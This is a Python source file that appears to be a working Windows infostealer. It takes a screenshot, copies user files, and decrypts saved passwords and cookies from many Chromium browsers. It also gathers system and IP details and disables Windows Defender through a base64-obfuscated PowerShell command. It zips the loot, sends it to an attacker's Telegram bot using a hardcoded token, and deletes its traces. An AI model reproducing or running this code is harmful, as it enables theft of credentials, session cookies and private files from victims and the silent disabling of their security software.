


from PIL import ImageGrab
import os
import shutil
import sqlite3
import json
import base64
from Cryptodome.Cipher import AES
import win32crypt
import requests
from aiogram import Bot
import asyncio
import subprocess
import psutil, wmi
import locale
from datetime import datetime
from time import sleep
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.Util.Padding import pad, unpad
key = b'\xd4\xaae\x19 \xdc\n\xa5~\xff\x8d>\\\x8e\xb7\xb4'
iv =  b'\xca4F\xca\xb2\xc0\x18\xa8\x11\x06\x08\xa3\x84\xa2\x9f\r'

def decrypt(cipher_text, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_text = unpad(cipher.decrypt(cipher_text), AES.block_size)
    return decrypted_text.decode('utf-8')

# cipher_texttoken = b'\x989\xcb\x15\x08\xf9\xe2\xd0\x0e?\xa0EE\x1e}\x06\xf6\x08\xb6\x9a\x8b\xd7`\x06\x88\x19\xd1V$\x19\xe2\xfc\xad\xd6\xc9\x0e\x01\xcb\xf3\xbd\xe9\xd0\xee\x11\x1e\x8c\xf9\xc7'
# cipher_textids = b'\xe7\xa8D\xb2\xe2\xe6\x05}\xcd\x89\x1e\xfer\xd6\xf4M'
# decrypted_texttoken = decrypt(cipher_texttoken, key, iv)
# decrypted_textid = decrypt(cipher_textids, key, iv)
# idbot = decrypted_textid
# token = decrypted_texttoken
idbot = '1002061706055'  # Đặt ID của bạn ở đây
token = '6055727531:AAEKXKTUn2xK3mdi02_mGWrcTrBL5ydrghU'  # Đặt token của bạn ở đây

exe = 'BASE64_ENCODED_EXE'
grabfiles = 0
passwd = 0
cookies = 0
path_data = 'C:\\Users\\Public\\Document'
try:os.mkdir(path_data)
except:pass
try:os.mkdir(path_data+'\\Cookie')
except:pass
try:os.mkdir(path_data+'\\Password')
except:pass
try:os.mkdir(path_data+'\\Log')
except:pass
try:os.mkdir(path_data+'\\GrabFiles')
except:pass
def get_antivirus_info():
    try:
        c = wmi.WMI()
        antivirus_products = []

        query = "SELECT * FROM AntiVirusProduct"
        for product in c.query(query):
            antivirus_products.append(product.displayName)

        if antivirus_products:
            return ", ".join(antivirus_products)
        else:
            return "N/A"
    except Exception as e:
        #print("Error fetching antivirus information:", e)
        return "N/A"


def check_chrome_running():
    for proc in os.popen('tasklist').readlines():
        if 'chrome.exe' in proc:
            subprocess.run('taskkill /f /im chrome.exe', shell=True)

def find_profile(data_path):
    profile=[]    
    profile.append('Default')
    try:
        objects = os.listdir(data_path)
        files_dir = [f for f in objects if os.path.isdir(os.path.join(data_path, f))]
        for folder in files_dir:
            text = folder.split()
            if(text[0] == 'Profile'):
                profile.append(folder)
        return profile
    except:pass
def screenshot():
    screenshot = ImageGrab.grab()

    screenshot_path = os.path.join(path_data, "screen.png")

    screenshot.save(screenshot_path, "PNG")
def pcinfo():
    try:
        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
    except Exception as e:
        #print("Error fetching computer OS:", e)
        computer_os = None

    try:
        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
    except Exception as e:
        #print("Error fetching CPU information:", e)
        cpu = None

    try:
        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
    except Exception as e:
        #print("Error fetching GPU information:", e)
        gpu = None

    try:
        ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
                     shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
    except Exception as e:
        #print("Error fetching RAM information:", e)
        ram = None

    username = os.getenv("UserName")
    hostname = os.getenv("COMPUTERNAME")

    try:
        hwid = subprocess.check_output('wmic csproduct get uuid', shell=True,
                                        stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except Exception as e:
        #print("Error fetching hardware UUID:", e)
        hwid = None

    try:
        ip = requests.get('https://api.ipify.org').text
    except Exception as e:
        #print("Error fetching IP address:", e)
        ip = None

    try:
        interface, addrs = next(iter(psutil.net_if_addrs().items()))
        mac = addrs[0].address
    except Exception as e:
        #print("Error fetching MAC address:", e)
        interface = None
        mac = None

    try:
        system_locale, _ = locale.getlocale()
        language = system_locale if system_locale else "en-US"
    except Exception as e:
        #print("Error fetching system locale:", e)
        language = None

    antivirus = get_antivirus_info()

    return computer_os, cpu, gpu, ram, username, hostname, hwid, ip, interface, mac, language, antivirus
def get_country(ip_address):
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        data = response.json()
        country = data.get("country", "N/A")
        return country
    except Exception as e:
        #print("Error fetching country information:", e)
        return "N/A"
def browser():
    a = [
        {
            'name': 'Google',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"))
        },
        {
            'name': 'CocCoc',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CocCoc", "Browser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CocCoc", "Browser", "User Data"))
        },
        {
            'name': 'Edge',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"))
        },
        {
            'name': 'Brave',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"))
        },
        {
            'name': 'Chromium',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Chromium", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Chromium", "User Data"))
        },
        {
            'name': 'Amigo',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Amigo", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Amigo", "User Data"))
        },
        {
            'name': 'Torch',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Torch", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Torch", "User Data"))
        },
        {
            'name': 'Kometa',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Kometa", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Kometa", "User Data"))
        },
        {
            'name': 'Orbitum',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Orbitum", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Orbitum", "User Data"))
        },
        {
            'name': 'CentBrowser',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CentBrowser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "CentBrowser", "User Data"))
        },
        {
            'name': '7Star',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "7Star", "7Star", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "7Star", "7Star", "User Data"))
        },
        {
            'name': 'Sputnik',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Sputnik", "Sputnik", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Sputnik", "Sputnik", "User Data"))
        },
        {
            'name': 'Vivaldi',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Vivaldi", "User Data"))
        },
        {
            'name': 'GoogleChromeSxS',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome SxS", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome SxS", "User Data"))
        },
        {
            'name': 'EpicPrivacyBrowser',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Epic Privacy Browser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Epic Privacy Browser", "User Data"))
        },
        {
            'name': 'MicrosoftEdge',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"))
        },
        {
            'name': 'Uran',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "uCozMedia", "Uran", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "uCozMedia", "Uran", "User Data"))
        },
        {
            'name': 'Yandex',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Yandex", "YandexBrowser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Yandex", "YandexBrowser", "User Data"))
        },
        {
            'name': 'Brave',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"))
        },
        {
            'name': 'Iridium',
            'path': os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Iridium", "User Data"),
            'profile': find_profile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Iridium", "User Data"))
        },
        {
            'name': 'Opera',
            'path': os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable"),
            'profile': find_profile(os.path.join(os.environ["APPDATA"], "Opera Software", "Opera Stable"))
        },
        {
            'name': 'OperaGX',
            'path': os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable"),
            'profile': find_profile(os.path.join(os.environ["APPDATA"], "Opera Software", "Opera GX Stable"))
        },
    ]

    return a
def getSecretKey(path1):
    try:
        path = os.path.normpath(path1 + "\\Local State")
        with open(path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except:
        pass
#Decrypt
def decryptPayload(cipher, payload):
    return cipher.decrypt(payload)
def generateCipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)
def decryptPassword(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generateCipher(secret_key, initialisation_vector)
        decrypted_pass = decryptPayload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except:
        pass
def start1():
    bc = browser()
    cookie = []
    for bs in bc:
        if os.path.exists(bs['path']):
            for profile in bs['profile']:
                try:
                    if os.path.exists(os.path.join(bs['path'], profile, 'Network', 'Cookies')):
                        shutil.copyfile(os.path.join(bs['path'], profile, 'Network', 'Cookies'), os.path.join(path_data, 'Log','Cookie '+bs['name']+' '+profile ))
                        cookie.append({'path':os.path.join(path_data, 'Log','Cookie '+bs['name']+' '+profile ),'pathkey':bs['path'],'name':bs['name'],'profile':profile})
                except:pass
        else:
            pass
    return cookie
def start2():
    bc = browser()
    password = []
    for bs in bc:
        if os.path.exists(bs['path']):
            for profile in bs['profile']:
                try:
                    if os.path.exists(os.path.join(bs['path'], profile, 'Login Data')):
                        shutil.copyfile(os.path.join(bs['path'], profile, 'Login Data'), os.path.join(path_data, 'Log','Login '+bs['name']+' '+profile ))
                        password.append({'path':os.path.join(path_data, 'Log','Login '+bs['name']+' '+profile),'pathkey':bs['path'],'name':bs['name'],'profile':profile})
                except:pass            
        else:
            pass
    return password
def extract():
    global cookies, passwd
    screenshot()
    grab_files()
    datacookie = start1()
    for row in datacookie:            
        c = sqlite3.connect(row['path'])
        cursor = c.cursor()
        select_statement = 'SELECT host_key, name, value, encrypted_value,is_httponly,is_secure,expires_utc FROM cookies'
        cursor.execute(select_statement)
        bc = cursor.fetchall()
        data1 = []
        for user in bc:
            if user[4] == 1 : httponly = "TRUE"
            else:httponly = "FALSE"
            if user[5] == 1 : secure = "TRUE"
            else:secure = "FALSE"
            value = decryptPassword(user[3], getSecretKey(row['pathkey']))
            cookie = f"{user[0]}\t{httponly}\t{'/'}\t{secure}\t\t{user[1]}\t{value}\n"    
            data1.append(cookie)
            cookies +=1
        with open(os.path.join(path_data,'Cookie',row['name']+' '+row['profile']+'.txt'), "w",encoding='utf-8') as f:
            for line in data1:
                f.write(line)
    
    datapassword = start2()
    for row in datapassword:
        c = sqlite3.connect(row['path'])
        cursor = c.cursor()
        select_statement = 'SELECT action_url, username_value, password_value FROM logins'
        cursor.execute(select_statement)
        login_data = cursor.fetchall()
        data2 = []
        for userdatacombo in login_data:
            if userdatacombo[1] != None and userdatacombo[2] != None and userdatacombo[1] != ""  and userdatacombo[2] != "" and userdatacombo[0] != "":
                password = decryptPassword(userdatacombo[2], getSecretKey(row['pathkey']))
                data = "**************************************************\nURL: " + userdatacombo[0] + " \nUsername: " + userdatacombo[1] + " \nPassword: " + str(password)
                data2.append(data)
                passwd +=1
            else:
                pass
        with open(os.path.join(path_data,'Password',row['name']+' '+row['profile']+'.txt'), "w",encoding='utf-8') as f:
            for line in data2:
                f.write(line + "\n")
def disable_defender():
    cmd = base64.b64decode(b'cG93ZXJzaGVsbCBTZXQtTXBQcmVmZXJlbmNlIC1EaXNhYmxlSW50cnVzaW9uUHJldmVudGlvblN5c3RlbSAkdHJ1ZSAtRGlzYWJsZUlPQVZQcm90ZWN0aW9uICR0cnVlIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICR0cnVlIC1EaXNhYmxlU2NyaXB0U2Nhbm5pbmcgJHRydWUgLUVuYWJsZUNvbnRyb2xsZWRGb2xkZXJBY2Nlc3MgRGlzYWJsZWQgLUVuYWJsZU5ldHdvcmtQcm90ZWN0aW9uIEF1ZGl0TW9kZSAtRm9yY2UgLU1BUFNSZXBvcnRpbmcgRGlzYWJsZWQgLVN1Ym1pdFNhbXBsZXNDb25zZW50IE5ldmVyU2VuZCAmJiBwb3dlcnNoZWxsIFNldC1NcFByZWZlcmVuY2UgLVN1Ym1pdFNhbXBsZXNDb25zZW50IDI=').decode()
    subprocess.run(cmd, shell=True, capture_output=True)
def openexe(encoded_content):
    decoded_content = base64.b64decode(encoded_content)
    with open('C:\\Users\\Public\\setup.exe', 'wb') as file:
        file.write(decoded_content)
    os.startfile('C:\\Users\\Public\\setup.exe')
async def sendfile(TOKEN, ID, path, caption1):
    try:
        bot = Bot(token=TOKEN)
        with open(path, 'rb') as file:
            await bot.send_document(chat_id=ID, document=file, caption=caption1)
        await bot.stop()
    except:
        pass
name_f = ""
def grab_files():
    global grabfiles
    file_extensions = ['.txt','.py', '.html', '.php','.pyw','.pyc', '.jpg', '.jpeg', '.png', '.session', '.js', '.java']
    source_folders = [
        os.path.expanduser("~\\Downloads"),
        os.path.expanduser("~\\Desktop"),
        os.path.expanduser("~\\Documents"),
        os.path.expanduser("~\\Pictures")
    ]
    
    max_file_size = 500 * 1024 
    
    for source_folder in source_folders:
        if os.path.exists(source_folder):
            for root, _, files in os.walk(source_folder):
                for file in files:
                    _, extension = os.path.splitext(file)
                    if extension in file_extensions:
                        source_path = os.path.join(root, file)
                        if os.path.getsize(source_path) <= max_file_size:
                            destination_path = os.path.join(path_data, 'GrabFiles', file)
                            shutil.copy(source_path, destination_path)
                            grabfiles +=1
                            #print(f"Copied {file}")
                        else:
                            continue
                            #print(f"File {file} exceeds size limit. Not copying.")
        else:
            continue
            #print(f"Source folder not found: {source_folder}")


async def main(TOKEN, ID):
    # try:
    #     openexe(exe)
    # except:pass
    disable_defender()
    computer_os, cpu, gpu, ram, username, hostname, hwid, ip, interface, mac, language, antivirus = pcinfo()
    country = get_country(ip)
    
    check_chrome_running()
    extract()
    name_f = f'Data_{hostname}_{username}@[{country}]'
    z_ph = os.path.join(os.environ["TEMP"], name_f +'.zip');shutil.make_archive(z_ph[:-4], 'zip', path_data)
    caption = f"==== @CyberCrlm3 ====\n⏰ Date => {datetime.now().strftime('%m/%d/%Y %H:%M')}\n💻System => {computer_os}\n👤 User => {username}\n🆔 PC => {hostname}\n🏴 Country => [{country}]\n🔍 IP => {ip}\n🔍 Mac => {mac}\n⚙ Ram => {ram}\n⚙ Cpu => {cpu}\n⚙ Gpu => {gpu}\n📝 Language => {language}\n🔓 Antivirus => {antivirus}\n ====[ User Data ]====\n📂 FileGrabber => {grabfiles}\n ====[ Browsers Data ]====\n🗝 Passwords => {passwd}\n🍪 Cookies => {cookies}"
    # await sendfile(TOKEN, ID, z_ph, caption)
    await sendfile(token, idbot, z_ph, caption)
    shutil.rmtree(os.environ["TEMP"], name_f +'.zip');shutil.rmtree(os.environ["TEMP"], name_f)
    try:
       shutil.rmtree(path_data)
    except:
        try:
            os.system(f"rmdir {path_data}")
        except:
            pass

    await sendfile(TOKEN, ID, z_ph, caption)

if __name__ == '__main__':
    asyncio.run(main(token, idbot))
    try:
        shutil.rmtree(os.path.join(os.environ["TEMP"], name_f))
    except Exception as e:
        pass

    
    